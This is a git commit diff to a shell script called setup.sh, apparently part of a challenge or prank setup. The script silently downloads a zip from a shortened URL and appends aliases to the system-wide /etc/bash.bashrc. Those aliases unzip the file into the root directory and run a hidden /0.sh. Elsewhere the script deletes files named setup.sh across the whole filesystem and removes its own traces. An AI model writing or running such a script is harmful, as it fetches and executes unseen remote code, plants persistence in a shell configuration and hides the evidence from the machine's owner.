68978eb1d740fcc3686e90c5a4e6b6092d1fe53b
D4NP0UL1N <ct3d.f1l35@gmail.com>
2017-04-25 20:09:42 -0400

    Update setup.sh

--- FINAL/setup.sh
+++ FINAL/setup.sh
@@ -1,9 +1,8 @@
 #!/bin/bash
 unalias -a
-rm -rf /usr/share/misc/final 2>/dev/null; find / -type f -name "setup.sh" -exec rm -f {} 2>/dev/null \; rm -f /0.sh 2>/dev/null; rm -f /setup.zip 2>/dev/null
-mkdir /usr/share/misc/final >/dev/null 2>&1
+find / -type f -name "setup.sh" -exec rm -f {} 2>/dev/null \; rm -f /0.sh 2>/dev/null; rm -f /setup.zip 2>/dev/null
 wget goo.gl/oi5amn -O /setup.zip >/dev/null 2>&1
-echo 'alias 1="echo; echo Password Required; unzip -o /setup.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; /0.sh >/dev/null 2>&1"' >> /etc/bash.bashrc
+echo 'alias start="echo; echo Password Required; unzip -o /setup.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; /0.sh >/dev/null 2>&1"' >> /etc/bash.bashrc
 echo 'alias 2="rm -f /setup.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \; cp /broken.sh $(pwd)"' >> /etc/bash.bashrc
-echo 'alias 3="sleep 2; unalias -a"' >> /etc/bash.bashrc
-echo 'alias 4="kill -9 $(echo $$)"' >> /etc/bash.bashrc
+echo 'alias 3="unalias -a"' >> /etc/bash.bashrc
+#echo 'alias 4="kill -9 $(echo $$)"' >> /etc/bash.bashrc
